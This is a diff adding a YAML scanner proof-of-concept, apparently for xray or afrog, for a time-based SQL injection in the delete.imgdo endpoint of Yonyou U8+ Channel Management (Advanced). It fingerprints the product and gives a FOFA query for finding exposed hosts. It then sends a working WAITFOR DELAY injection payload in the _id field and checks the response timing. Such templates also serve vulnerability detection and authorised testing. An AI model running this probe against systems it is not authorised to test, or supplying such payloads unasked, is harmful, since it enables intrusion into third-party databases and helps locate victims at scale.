@@ -1,0 +1,32 @@
+id: poc-yaml-yongyon-u8-cm-ae-delete-imgdo-sqli
+info:
+  name: 用友U8+渠道管理(高级版) delete.imgdo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友U8+渠道管理(高级版)
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /indexbusiness.jsp
+  expression: status_code == 200 && contains(title,"渠道管理（高级版）")
+- method: POST
+  path: /business/test/delete.imgdo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: _id=';WAITFOR DELAY '0:0:{{.t1}}'--
+  expression: 'status_code == 200 &&
+
+    contains(body,`{"message":0}`) &&
+
+    !contains(body,"<") &&
+
+    duration > t1 &&
+
+    duration < t2
+
+    '
+transport: http
